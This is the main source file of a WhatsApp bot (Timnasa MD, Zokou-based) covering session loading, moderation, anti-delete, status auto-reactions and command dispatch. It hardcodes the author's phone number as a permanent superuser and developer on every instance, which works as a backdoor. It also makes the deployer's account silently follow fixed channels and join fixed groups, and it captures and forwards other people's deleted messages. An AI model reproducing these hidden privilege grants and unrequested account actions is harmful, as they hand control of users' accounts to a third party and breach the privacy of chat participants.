"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
  var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});

var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const baileys_1 = __importStar(require("@whiskeysockets/baileys"));
const logger_1 = __importDefault(require("@whiskeysockets/baileys/lib/Utils/logger"));
const logger = logger_1.default.child({});
logger.level = 'silent';
const pino = require("pino");
const boom_1 = require("@hapi/boom");
const conf = require("./set");
const axios = require("axios");
let fs = require("fs-extra");
let path = require("path");
const FileType = require('file-type');
const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');

const { verifierEtatJid , recupererActionJid } = require("./bdd/antilien");
const { atbverifierEtatJid , atbrecupererActionJid } = require("./bdd/antibot");
let evt = require(__dirname + "/framework/zokou");
const {isUserBanned , addUserToBanList , removeUserFromBanList} = require("./bdd/banUser");
const {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./bdd/banGroup");
const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./bdd/onlyAdmin");
const { getAutoAiStatus } = require("./framework/autoaiDb");

let { reagir } = require(__dirname + "/framework/app");
var session = conf.session.replace(/TIMNASA-MD;;;=>/g,"");
const prefixe = conf.PREFIXE;
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);

// Global status and Memory Store for Anti-Delete
global.antidelete = (conf.ADM || "yes").toLowerCase() === "yes";
global.deletedMessagesStore = global.deletedMessagesStore || new Map();

// Global status for Chatbot-Pro (Default: Off)
global.chatbotProStatus = false;

// List of Channels to Follow & Groups to Join Automatically
const channelsToFollow = [
    "120363412342012325@newsletter",
    "120363430891706670@newsletter",
    "120363430529538905@newsletter"
];

const groupInvites = [
    "CZeYmjCxjNB7sPKImMcNnt",
    "I4UT9beGRgwCHwx619XRxa"
];

// Function for Auto-Following Channels & Auto-Joining Groups
async function autoJoinAndFollow(zk) {
    // 1. Auto-Follow Channels
    for (const channelJid of channelsToFollow) {
        try {
            await zk.newsletterFollow(channelJid);
            console.log(`✅ Successfully followed Channel: ${channelJid}`);
        } catch (error) {
            console.error(`❌ Failed to follow Channel ${channelJid}:`, error.message);
        }
        await new Promise(resolve => setTimeout(resolve, 2500)); // 2.5 second delay
    }

    // 2. Auto-Join Groups
    for (const code of groupInvites) {
        try {
            await zk.groupAcceptInvite(code);
            console.log(`✅ Successfully joined Group with code: ${code}`);
        } catch (error) {
            console.error(`❌ Failed to join Group ${code}:`, error.message);
        }
        await new Promise(resolve => setTimeout(resolve, 3000)); // 3 second delay
    }
}

async function authentification() {
    try {
        if (!fs.existsSync(__dirname + "/auth/creds.json")) {
            console.log("Connecting...");
            await fs.writeFileSync(__dirname + "/auth/creds.json", atob(session), "utf8");
        }
        else if (fs.existsSync(__dirname + "/auth/creds.json") && session != "zokk") {
            await fs.writeFileSync(__dirname + "/auth/creds.json", atob(session), "utf8");
        }
    }
    catch (e) {
        console.log("Invalid Session: " + e);
        return;
    }
}
authentification();

const store = (0, baileys_1.makeInMemoryStore)({
    logger: pino().child({ level: "silent", stream: "store" }),
});

// Helper function to fetch current date and time
function getCurrentDateTime() {
    const now = new Date();
    return now.toLocaleString('en-US', { timeZone: 'Africa/Dar_es_Salaam' });
}

// Function for Chatbot-Pro
async function handleChatbotPro(zk, ms, origineMessage, texte, verifCom) {
    try {
        if (!global.chatbotProStatus) return;
        if (ms.key.fromMe) return;
        if (!texte || verifCom || texte.startsWith('.') || texte.startsWith('!') || texte.startsWith('/')) return;

        // Reaction emoji indicating AI processing
        await zk.sendMessage(origineMessage, { react: { text: "🧠", key: ms.key } });

        const response = await axios.get(`https://api-faa.my.id/faa/ai-realtime?text=${encodeURIComponent(texte)}`, { timeout: 10000 });
        
        const aiMessage = response.data?.result || response.data?.response || response.data?.message;

        if (aiMessage) {
            await zk.sendMessage(origineMessage, { text: aiMessage }, { quoted: ms });
        }
    } catch (error) {
        console.error("Chatbot-Pro Error:", error.message);
    }
}

setTimeout(() => {
    async function main() {
        const { version, isLatest } = await (0, baileys_1.fetchLatestBaileysVersion)();
        const { state, saveCreds } = await (0, baileys_1.useMultiFileAuthState)(__dirname + "/auth");
        const sockOptions = {
            version,
            logger: pino({ level: "silent" }),
            browser: ['Timnasa md', "safari", "1.0.0"],
            printQRInTerminal: true,
            fireInitQueries: false,
            shouldSyncHistoryMessage: true,
            downloadHistory: true,
            syncFullHistory: true,
            generateHighQualityLinkPreview: true,
            markOnlineOnConnect: false,
            keepAliveIntervalMs: 30_000,
            auth: {
                creds: state.creds,
                keys: (0, baileys_1.makeCacheableSignalKeyStore)(state.keys, logger),
            },
            getMessage: async (key) => {
                if (store) {
                    const msg = await store.loadMessage(key.remoteJid, key.id, undefined);
                    return msg.message || undefined;
                }
                return {
                    conversation: 'An Error Occurred, Repeat Command!'
                };
            }
        };
        const zk = (0, baileys_1.default)(sockOptions);
        store.bind(zk.ev);
        
        // ==================== AUTO BIO UPDATE ====================
        setInterval(async () => {
            try {
                if (conf.AUTO_BIO === "yes") {
                    const currentDateTime = getCurrentDateTime();
                    const bioText = `Timnasa_Md is running 🚗 | ${currentDateTime}`;
                    await zk.updateProfileStatus(bioText);
                    console.log(`Updated Bio: ${bioText}`);
                }
            } catch (e) {
                console.error("Auto Bio Error:", e.message);
            }
        }, 60000);

        // ==================== ADVANCED ANTI-CALL ====================
        let lastTextTime = 0;
        const messageDelay = 5000;

        zk.ev.on('call', async (callData) => {
            if (conf.ANTI_CALL === 'yes') {
                for (const call of callData) {
                    if (call.status === 'offer') {
                        const callId = call.id;
                        const callerJid = call.from;
                        
                        let callerName = "User";
                        if (store && store.contacts && store.contacts[callerJid]) {
                            callerName = store.contacts[callerJid].name || store.contacts[callerJid].notify || callerJid.split('@')[0];
                        } else {
                            callerName = callerJid.split('@')[0];
                        }

                        console.log(`⚠️ Incoming call detected from ${callerName} (${callerJid})`);

                        await zk.rejectCall(callId, callerJid);

                        const currentTime = Date.now();
                        if (currentTime - lastTextTime >= messageDelay) {
                            const warningText = `⚠️ *WARNING DEAR @${callerJid.split('@')[0]}!*\n\n` +
                                `Hello *${callerName}*, the **TIMNASA TMD2** system automatically rejects calls.\n` +
                                `Please refrain from calling via WhatsApp to avoid getting blocked!\n\n` +
                                `> *Send your text message here and you will receive a reply.*`;

                            await zk.sendMessage(callerJid, {
                                text: warningText,
                                mentions: [callerJid]
                            });

                            lastTextTime = currentTime;
                        } else {
                            console.log('Message skipped to prevent overflow');
                        }
                    }
                }
            }
        });

        if (conf.AUTOREACT_STATUS === "yes") {
            zk.ev.on("messages.upsert", async (m) => {
                const { messages } = m;
                
                for (const message of messages) {
                    if (message.key && message.key.remoteJid === "status@broadcast") {
                        try {
                            const reactionEmojis = ["❤️", "🔥", "👍", "😂", "😮", "😢", "🤔", "👏", "🎉", "🤩"];
                            const randomEmoji = reactionEmojis[Math.floor(Math.random() * reactionEmojis.length)];
                            
                            await zk.readMessages([message.key]);
                            await new Promise(resolve => setTimeout(resolve, 500));
                            
                            await zk.sendMessage(message.key.remoteJid, {
                                react: {
                                    text: randomEmoji,
                                    key: message.key
                                }
                            });
                            
                            console.log(`Reacted to status from ${message.key.participant} with ${randomEmoji}`);
                            await new Promise(resolve => setTimeout(resolve, 3000));
                        } catch (error) {
                            console.error("Status reaction failed:", error);
                        }
                    }
                }
            });
        }

        // ==================== ANTI-DELETE: STORE INCOMING MESSAGES ====================
        zk.ev.on('messages.upsert', async (chatUpdate) => {
            try {
                const msg = chatUpdate.messages[0];
                if (!msg || !msg.message) return;

                if (msg.key && msg.key.id) {
                    global.deletedMessagesStore.set(msg.key.id, msg);

                    if (global.deletedMessagesStore.size > 3000) {
                        const firstKey = global.deletedMessagesStore.keys().next().value;
                        global.deletedMessagesStore.delete(firstKey);
                    }
                }
            } catch (err) {
                console.error("Error storing message for Anti-Delete:", err);
            }
        });

        // ==================== ANTI-DELETE: RESTORE DELETED MESSAGES ====================
        zk.ev.on('messages.update', async (updates) => {
            if (!global.antidelete) return;

            for (const update of updates) {
                if (update.update?.protocolMessage?.type === 0 || update.update?.protocolMessage?.type === 'REVOKE') {
                    const deletedKey = update.update.protocolMessage.key;
                    if (!deletedKey || deletedKey.fromMe) continue;

                    const originalMsg = global.deletedMessagesStore.get(deletedKey.id);
                    if (!originalMsg) continue;

                    try {
                        const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
                        const decodeJid = (jid) => {
                            if (!jid) return jid;
                            if (/:\d+@/gi.test(jid)) {
                                let decode = (0, baileys_1.jidDecode)(jid) || {};
                                return decode.user && decode.server && decode.user + '@' + decode.server || jid;
                            }
                            return jid;
                        };

                        const botOwner = decodeJid(zk.user.id);
                        const sender = deletedKey.participant || deletedKey.remoteJid;
                        const isGroup = deletedKey.remoteJid.endsWith('@g.us');

                        let captionInfo = `🗑️ *TIMNASA-TMD ANTI-DELETE* 🗑️\n\n` +
                                          `👤 *Sender:* @${sender.split('@')[0]}\n` +
                                          `📍 *From:* ${isGroup ? 'Group Chat' : 'Private DM'}\n` +
                                          `🕒 *Time:* ${new Date().toLocaleTimeString()}\n\n` +
                                          `👇 *Deleted Content:*`;

                        const m = originalMsg.message;

                        if (m.conversation || m.extendedTextMessage?.text) {
                            const textContent = m.conversation || m.extendedTextMessage.text;
                            await zk.sendMessage(botOwner, {
                                text: `${captionInfo}\n\n💬 *Text:* ${textContent}`,
                                mentions: [sender]
                            });
                        }
                        else if (m.imageMessage) {
                            const stream = await downloadContentFromMessage(m.imageMessage, 'image');
                            let buffer = Buffer.alloc(0);
                            for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

                            await zk.sendMessage(botOwner, {
                                image: buffer,
                                caption: `${captionInfo}\n\n📝 *Caption:* ${m.imageMessage.caption || 'None'}`,
                                mentions: [sender]
                            });
                        }
                        else if (m.videoMessage) {
                            const stream = await downloadContentFromMessage(m.videoMessage, 'video');
                            let buffer = Buffer.alloc(0);
                            for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

                            await zk.sendMessage(botOwner, {
                                video: buffer,
                                caption: `${captionInfo}\n\n📝 *Caption:* ${m.videoMessage.caption || 'None'}`,
                                mentions: [sender]
                            });
                        }
                        else if (m.audioMessage) {
                            const stream = await downloadContentFromMessage(m.audioMessage, 'audio');
                            let buffer = Buffer.alloc(0);
                            for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

                            await zk.sendMessage(botOwner, { text: captionInfo, mentions: [sender] });
                            await zk.sendMessage(botOwner, { audio: buffer, mimetype: 'audio/mp4', ptt: true });
                        }
                    } catch (e) {
                        console.error("Anti-delete error:", e);
                    }
                }
            }
        });
        
        zk.ev.on("messages.upsert", async (m) => {
            const { messages } = m;
            const ms = messages[0];
            if (!ms.message)
                return;
            const decodeJid = (jid) => {
                if (!jid)
                    return jid;
                if (/:\d+@/gi.test(jid)) {
                    let decode = (0, baileys_1.jidDecode)(jid) || {};
                    return decode.user && decode.server && decode.user + '@' + decode.server || jid;
                }
                else
                    return jid;
            };
            var mtype = (0, baileys_1.getContentType)(ms.message);
            var texte = mtype == "conversation" ? ms.message.conversation : mtype == "imageMessage" ? ms.message.imageMessage?.caption : mtype == "videoMessage" ? ms.message.videoMessage?.caption : mtype == "extendedTextMessage" ? ms.message?.extendedTextMessage?.text : mtype == "buttonsResponseMessage" ?
                ms?.message?.buttonsResponseMessage?.selectedButtonId : mtype == "listResponseMessage" ?
                ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId : mtype == "messageContextInfo" ?
                (ms?.message?.buttonsResponseMessage?.selectedButtonId || ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId || ms.text) : "";
            var origineMessage = ms.key.remoteJid;
            var idBot = decodeJid(zk.user.id);
            var servBot = idBot.split('@')[0];
            
            const verifGroupe = origineMessage?.endsWith("@g.us");
            var infosGroupe = verifGroupe ? await zk.groupMetadata(origineMessage) : "";
            var nomGroupe = verifGroupe ? infosGroupe.subject : "";
            var msgRepondu = ms.message.extendedTextMessage?.contextInfo?.quotedMessage;
            var auteurMsgRepondu = decodeJid(ms.message?.extendedTextMessage?.contextInfo?.participant);
            
            var mr = ms.Message?.extendedTextMessage?.contextInfo?.mentionedJid;
            var utilisateur = mr ? mr : msgRepondu ? auteurMsgRepondu : "";
            var auteurMessage = verifGroupe ? (ms.key.participant ? ms.key.participant : ms.participant) : origineMessage;
            if (ms.key.fromMe) {
                auteurMessage = idBot;
            }
            
            var membreGroupe = verifGroupe ? ms.key.participant : '';
            const { getAllSudoNumbers } = require("./bdd/sudo");
            const nomAuteurMessage = ms.pushName;
            const dj = '255693629079';
            const dj2 = '255693629079';
            const dj3 = "255693629079";
            const luffy = '255693629079';
            const sudo = await getAllSudoNumbers();
            const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
            const allAllowedNumbers = superUserNumbers.concat(sudo);
            const superUser = allAllowedNumbers.includes(auteurMessage);
            
            var dev = [dj, dj2,dj3,luffy].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
            function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
            
            console.log("\n𝚻𝚰𝚳𝚴𝚫𝐒𝚫 𝚻𝚳𝐃2 is ONLINE");
            console.log("=========== Written Message ===========");
            if (verifGroupe) {
                console.log("Group Message from: " + nomGroupe);
            }
            console.log("Message Sent By: " + "[" + nomAuteurMessage + " : " + auteurMessage.split("@s.whatsapp.net")[0] + " ]");
            console.log("Message Type: " + mtype);
            console.log("------ Message Content ------");
            console.log(texte);
            
            function groupeAdmin(membreGroupe) {
                let admin = [];
                for (m of membreGroupe) {
                    if (m.admin == null)
                        continue;
                    admin.push(m.id);
                }
                return admin;
            }

            var etat = conf.ETAT;
            if(etat==1)
            {await zk.sendPresenceUpdate("available",origineMessage);}
            else if(etat==2)
            {await zk.sendPresenceUpdate("composing",origineMessage);}
            else if(etat==3)
            {
            await zk.sendPresenceUpdate("recording",origineMessage);
            }
            else
            {
                await zk.sendPresenceUpdate("unavailable",origineMessage);
            }

            const mbre = verifGroupe ? await infosGroupe.participants : '';
            let admins = verifGroupe ? groupeAdmin(mbre) : '';
            const verifAdmin = verifGroupe ? admins.includes(auteurMessage) : false;
            var verifZokouAdmin = verifGroupe ? admins.includes(idBot) : false;
            
            const arg = texte ? texte.trim().split(/ +/).slice(1) : null;
            const verifCom = texte ? texte.startsWith(prefixe) : false;
            const com = verifCom ? texte.slice(1).trim().split(/ +/).shift().toLowerCase() : false;
           
            const lien = conf.URL.split(',')  

            function mybotpic() {
                const indiceAleatoire = Math.floor(Math.random() * lien.length);
                const lienAleatoire = lien[indiceAleatoire];
                return lienAleatoire;
            }

            var commandeOptions = {
                superUser, dev,
                verifGroupe,
                mbre,
                membreGroupe,
                verifAdmin,
                infosGroupe,
                nomGroupe,
                auteurMessage,
                nomAuteurMessage,
                idBot,
                verifZokouAdmin,
                prefixe,
                arg,
                repondre,
                mtype,
                groupeAdmin,
                msgRepondu,
                auteurMsgRepondu,
                ms,
                mybotpic
            };

            // ===== CHATBOT-PRO EXECUTION =====
            await handleChatbotPro(zk, ms, origineMessage, texte, verifCom);

            // ===== CHATBOT AUTO-RESPONSE LOGIC =====
            if (!verifGroupe && texte && !verifCom && !ms.key.fromMe) {
                try {
                    const chatbotFile = path.join(__dirname, "data/chatbot.json");
                    
                    if (fs.existsSync(chatbotFile)) {
                        const chatbotData = JSON.parse(fs.readFileSync(chatbotFile, "utf8"));
                        const isChatbotEnabled = chatbotData[auteurMessage] || false;

                        if (isChatbotEnabled) {
                            const currentTime = Date.now();
                            if (!global.lastChatbotResponse) global.lastChatbotResponse = {};
                            if (!global.lastChatbotResponse[auteurMessage]) global.lastChatbotResponse[auteurMessage] = 0;

                            const timeSinceLastResponse = currentTime - global.lastChatbotResponse[auteurMessage];
                            const minDelay = 3000;

                            if (timeSinceLastResponse >= minDelay) {
                                const response = await axios.get("https://apis-keith.vercel.app/ai/gpt", {
                                    params: { q: texte },
                                    timeout: 10000,
                                });

                                if (response.data && response.data.result) {
                                    const gptResponse = response.data.result;
                                    await zk.sendMessage(origineMessage, { text: gptResponse }, { quoted: ms });
                                    global.lastChatbotResponse[auteurMessage] = currentTime;
                                } else {
                                    console.log("API response missing result:", response.data);
                                }
                            }
                        }
                    } else {
                        console.log("chatbot.json file does not exist at:", chatbotFile);
                    }
                } catch (error) {
                    console.error("Chatbot Error Detail:", error.message);
                }
            }

            if (ms.key && ms.key.remoteJid === "status@broadcast" && conf.AUTO_READ_STATUS === "yes") {
                await zk.readMessages([ms.key]);
            }
            if (ms.key && ms.key.remoteJid === 'status@broadcast' && conf.AUTO_DOWNLOAD_STATUS === "yes") {
                if (ms.message.extendedTextMessage) {
                    var stTxt = ms.message.extendedTextMessage.text;
                    await zk.sendMessage(idBot, { text: stTxt }, { quoted: ms });
                }
                else if (ms.message.imageMessage) {
                    var stMsg = ms.message.imageMessage.caption;
                    var stImg = await zk.downloadAndSaveMediaMessage(ms.message.imageMessage);
                    await zk.sendMessage(idBot, { image: { url: stImg }, caption: stMsg }, { quoted: ms });
                }
                else if (ms.message.videoMessage) {
                    var stMsg = ms.message.videoMessage.caption;
                    var stVideo = await zk.downloadAndSaveMediaMessage(ms.message.videoMessage);
                    await zk.sendMessage(idBot, {
                        video: { url: stVideo }, caption: stMsg
                    }, { quoted: ms });
                }
            }
            if (!dev && origineMessage == "120363158701337904@g.us") {
                return;
            }
            
            if (texte && auteurMessage.endsWith("s.whatsapp.net")) {
                const { ajouterOuMettreAJourUserData } = require("./bdd/level"); 
                try {
                    await ajouterOuMettreAJourUserData(auteurMessage);
                } catch (e) {
                    console.error(e);
                }
            }
            
            try {
                if (ms.message[mtype].contextInfo.mentionedJid && (ms.message[mtype].contextInfo.mentionedJid.includes(idBot) ||  ms.message[mtype].contextInfo.mentionedJid.includes(conf.NUMERO_OWNER + '@s.whatsapp.net'))) {
                    if (origineMessage == "120363158701337904@g.us") {
                        return;
                    } ;
                    if(superUser) {console.log('Ignored superUser mention') ; return ;} 
                    let mbd = require('./bdd/mention') ;
                    let alldata = await mbd.recupererToutesLesValeurs() ;
                    let data = alldata[0] ;
                    if ( data.status === 'non') { console.log('Mention response inactive') ; return ;}
                    let msg ;
                    if (data.type.toLocaleLowerCase() === 'image') {
                        msg = {
                            image : { url : data.url},
                            caption : data.message
                        }
                    } else if (data.type.toLocaleLowerCase() === 'video' ) {
                        msg = {
                            video : {   url : data.url},
                            caption : data.message
                        }
                    } else if (data.type.toLocaleLowerCase() === 'sticker') {
                        let stickerMess = new Sticker(data.url, {
                            pack: conf.NOM_OWNER,
                            type: StickerTypes.FULL,
                            categories: ["🤩", "🎉"],
                            id: "12345",
                            quality: 70,
                            background: "transparent",
                        });
                        const stickerBuffer2 = await stickerMess.toBuffer();
                        msg = {
                            sticker : stickerBuffer2 
                        }
                    }  else if (data.type.toLocaleLowerCase() === 'audio' ) {
                        msg = {
                            audio : { url : data.url } ,
                            mimetype:'audio/mp4',
                        }
                    }
                    zk.sendMessage(origineMessage,msg,{quoted : ms})
                }
            } catch (error) {
            } 

            try {
                const yes = await verifierEtatJid(origineMessage)
                if (texte.includes('https://') && verifGroupe &&  yes  ) {
                    console.log("Link detected")
                    var verifZokAdmin = verifGroupe ? admins.includes(idBot) : false;
                    if(superUser || verifAdmin || !verifZokAdmin  ) { console.log('Doing nothing'); return};
                        
                    const key = {
                        remoteJid: origineMessage,
                        fromMe: false,
                        id: ms.key.id,
                        participant: auteurMessage
                    };
                    var txt = "Link detected, \n";
                    const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                    var sticker = new Sticker(gifLink, {
                        pack: 'Timnasa md',
                        author: conf.OWNER_NAME,
                        type: StickerTypes.FULL,
                        categories: ['🤩', '🎉'],
                        id: '12345',
                        quality: 50,
                        background: '#000000'
                    });
                    await sticker.toFile("st1.webp");
                    var action = await recupererActionJid(origineMessage);

                    if (action === 'remove') {
                        txt += `Message deleted \n @${auteurMessage.split("@")[0]} removed from group.`;
                        await zk.sendMessage(origineMessage, { sticker: fs.readFileSync("st1.webp") });
                        (0, baileys_1.delay)(800);
                        await zk.sendMessage(origineMessage, { text: txt, mentions: [auteurMessage] }, { quoted: ms });
                        try {
                            await zk.groupParticipantsUpdate(origineMessage, [auteurMessage], "remove");
                        }
                        catch (e) {
                            console.log("Anti-link error: ") + e;
                        }
                        await zk.sendMessage(origineMessage, { delete: key });
                        await fs.unlink("st1.webp"); 
                    } 
                    else if (action === 'delete') {
                        txt += `Message deleted \n @${auteurMessage.split("@")[0]} avoid sending links.`;
                        await zk.sendMessage(origineMessage, { text: txt, mentions: [auteurMessage] }, { quoted: ms });
                        await zk.sendMessage(origineMessage, { delete: key });
                        await fs.unlink("st1.webp");

                    } else if(action === 'warn') {
                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./bdd/warn') ;
                        let warn = await getWarnCountByJID(auteurMessage) ; 
                        let warnlimit = conf.WARN_COUNT
                        if ( warn >= warnlimit) { 
                            var kikmsg = `Link detected; you will be removed for reaching the warn limit.`;
                            await zk.sendMessage(origineMessage, { text: kikmsg , mentions: [auteurMessage] }, { quoted: ms }) ;
                            await zk.groupParticipantsUpdate(origineMessage, [auteurMessage], "remove");
                            await zk.sendMessage(origineMessage, { delete: key });
                        } else {
                            var rest = warnlimit - warn ;
                            var  msg = `Link detected, your warning count has been increased;\n Remaining warnings: ${rest}`;
                            await ajouterUtilisateurAvecWarnCount(auteurMessage)
                            await zk.sendMessage(origineMessage, { text: msg , mentions: [auteurMessage] }, { quoted: ms }) ;
                            await zk.sendMessage(origineMessage, { delete: key });
                        }
                    }
                }
            }
            catch (e) {
                console.log("DB error: " + e);
            }
    
            try {
                const botMsg = ms.key?.id?.startsWith('BAES') && ms.key?.id?.length === 16;
                const baileysMsg = ms.key?.id?.startsWith('BAE5') && ms.key?.id?.length === 16;
                if (botMsg || baileysMsg) {

                    if (mtype === 'reactionMessage') { console.log('Not reacting to reaction messages') ; return} ;
                    const antibotactiver = await atbverifierEtatJid(origineMessage);
                    if(!antibotactiver) {return};

                    if( verifAdmin || auteurMessage === idBot  ) { console.log('Doing nothing'); return};
                                
                    const key = {
                        remoteJid: origineMessage,
                        fromMe: false,
                        id: ms.key.id,
                        participant: auteurMessage
                    };
                    var txt = "Bot detected, \n";
                    const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                    var sticker = new Sticker(gifLink, {
                        pack: 'Timnasa md',
                        author: conf.OWNER_NAME,
                        type: StickerTypes.FULL,
                        categories: ['🤩', '🎉'],
                        id: '12345',
                        quality: 50,
                        background: '#000000'
                    });
                    await sticker.toFile("st1.webp");
                    var action = await atbrecupererActionJid(origineMessage);

                    if (action === 'remove') {
                        txt += `Message deleted \n @${auteurMessage.split("@")[0]} removed from group.`;
                        await zk.sendMessage(origineMessage, { sticker: fs.readFileSync("st1.webp") });
                        (0, baileys_1.delay)(800);
                        await zk.sendMessage(origineMessage, { text: txt, mentions: [auteurMessage] }, { quoted: ms });
                        try {
                            await zk.groupParticipantsUpdate(origineMessage, [auteurMessage], "remove");
                        }
                        catch (e) {
                            console.log("Anti-bot error: ") + e;
                        }
                        await zk.sendMessage(origineMessage, { delete: key });
                        await fs.unlink("st1.webp"); 
                    } 
                    else if (action === 'delete') {
                        txt += `Message deleted \n @${auteurMessage.split("@")[0]} avoid using automated bots.`;
                        await zk.sendMessage(origineMessage, { text: txt, mentions: [auteurMessage] }, { quoted: ms });
                        await zk.sendMessage(origineMessage, { delete: key });
                        await fs.unlink("st1.webp");

                    } else if(action === 'warn') {
                        const {getWarnCountByJID ,ajouterUtilisateurAvecWarnCount} = require('./bdd/warn') ;
                        let warn = await getWarnCountByJID(auteurMessage) ; 
                        let warnlimit = conf.WARN_COUNT
                        if ( warn >= warnlimit) { 
                            var kikmsg = `Bot detected; you will be removed for reaching the warn limit.`;
                            await zk.sendMessage(origineMessage, { text: kikmsg , mentions: [auteurMessage] }, { quoted: ms }) ;
                            await zk.groupParticipantsUpdate(origineMessage, [auteurMessage], "remove");
                            await zk.sendMessage(origineMessage, { delete: key });
                        } else {
                            var rest = warnlimit - warn ;
                            var  msg = `Bot detected, your warning count has been increased;\n Remaining warnings: ${rest}`;
                            await ajouterUtilisateurAvecWarnCount(auteurMessage)
                            await zk.sendMessage(origineMessage, { text: msg , mentions: [auteurMessage] }, { quoted: ms }) ;
                            await zk.sendMessage(origineMessage, { delete: key });
                        }
                    }
                }
            }
            catch (er) {
                console.log('Error: ' + er);
            }        
            
            if (verifCom) {
                const cd = evt.cm.find((zokou) => zokou.nomCom === (com));
                if (cd) {
                    try {
                        if ((conf.MODE).toLocaleLowerCase() != 'yes' && !superUser) {
                            return;
                        }

                        if (!superUser && origineMessage === auteurMessage&& conf.PM_PERMIT === "yes" ) {
                            repondre("You don't have access to commands here") ; return }

                        if (!superUser && verifGroupe) {
                            let req = await isGroupBanned(origineMessage);
                            if (req) { return }
                        }

                        if(!verifAdmin && verifGroupe) {
                            let req = await isGroupOnlyAdmin(origineMessage);
                            if (req) {  return }}
                 
                        if(!superUser) {
                            let req = await isUserBanned(auteurMessage);
                            if (req) {repondre("You are banned from bot commands"); return}
                        } 
                        reagir(origineMessage, zk, ms, cd.reaction);
                        cd.fonction(origineMessage, zk, commandeOptions);
                    }
                    catch (e) {
                        console.log("Error executing command: " + e);
                        zk.sendMessage(origineMessage, { text: "Error: " + e }, { quoted: ms });
                    }
                }
            }
        });

        const { recupevents } = require('./bdd/welcome'); 

        // ===== WELCOME & GOODBYE MESSAGE ENGINE =====
        zk.ev.on('group-participants.update', async (group) => {
            try {
                const metadata = await zk.groupMetadata(group.id);
                let groupMembers = metadata.participants;
                let groupName = metadata.subject;
                let groupDesc = metadata.desc ? metadata.desc.toString() : "No group description available.";
                let membres = group.participants;

                const getTopMembers = (members) => {
                    const rankEmojis = ['🥇', '🥈', '🥉', '🏅', '🎖️'];
                    const top5 = members.slice(0, 5);
                    return top5.map((m, index) => {
                        return `${rankEmojis[index]} *Rank ${index + 1}:* @${m.id.split('@')[0]}`;
                    }).join('\n');
                };

                for (let membre of membres) {
                    let targetPic;
                    try {
                        targetPic = await zk.profilePictureUrl(membre, 'image');
                    } catch {
                        try {
                            targetPic = await zk.profilePictureUrl(group.id, 'image');
                        } catch {
                            targetPic = 'https://telegra.ph/file/default-profile-pic.jpg'; 
                        }
                    }

                    if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'on')) {
                        let top5Jids = groupMembers.slice(0, 5).map(m => m.id);
                        let allMentions = [...new Set([membre, ...top5Jids])];

                        let welcomeMsg = `✨ *WELCOME TO THE GROUP!* ✨\n\n👋 Hello @${membre.split("@")[0]}, welcome to *${groupName}*!\n\n📝 *GROUP DESCRIPTION:*\n${groupDesc}\n\n📊 *GROUP STATISTICS:*\n👥 **Total Members:** ${groupMembers.length}\n\n🏆 *TOP 5 MEMBERS (RANKS):*\n${getTopMembers(groupMembers)}\n\n> *Engage and stay active to rank up!* 🚀`;
                        
                        await zk.sendMessage(group.id, { 
                            image: { url: targetPic }, 
                            caption: welcomeMsg, 
                            mentions: allMentions 
                        });

                    } else if (group.action == 'remove' && (await recupevents(group.id, "goodbye") == 'on')) {
                        let goodbyeMsg = `👋 *GOODBYE!* 👋\n\n@${membre.split("@")[0]} has left or was removed from *${groupName}*.\n\n📝 *GROUP DESCRIPTION:*\n${groupDesc}\n\n📊 *GROUP STATISTICS:*\n👥 **Remaining Members:** ${groupMembers.length}\n\n> *We wish you all the best!* 🚀`;
                        
                        await zk.sendMessage(group.id, { 
                            image: { url: targetPic }, 
                            caption: goodbyeMsg, 
                            mentions: [membre] 
                        });
                    }
                }

                if (group.action == 'promote' && (await recupevents(group.id, "antipromote") == 'on')) {
                    if (group.author == metadata.owner || group.author == conf.NUMERO_OWNER + '@s.whatsapp.net' || group.author == decodeJid(zk.user.id) || group.author == group.participants[0]) { return; };
                    await zk.groupParticipantsUpdate(group.id, [group.author, group.participants[0]], "demote");
                    zk.sendMessage(group.id, { text: `@${(group.author).split("@")[0]} violated the anti-promotion rule.`, mentions: [group.author, group.participants[0]] });
                }
            } catch (e) {
                console.error("Error in group-participants.update:", e);
            }
        });

        async function activateCrons() {
            const cron = require('node-cron');
            const { getCron } = require('./bdd/cron');
            let crons = await getCron();
            if (crons.length > 0) {
                for (let i = 0; i < crons.length; i++) {
                    if (crons[i].mute_at != null) {
                        let set = crons[i].mute_at.split(':');
                        cron.schedule(`${set[1]} ${set[0]} * * *`, async () => {
                            await zk.groupSettingUpdate(crons[i].group_id, 'announcement');
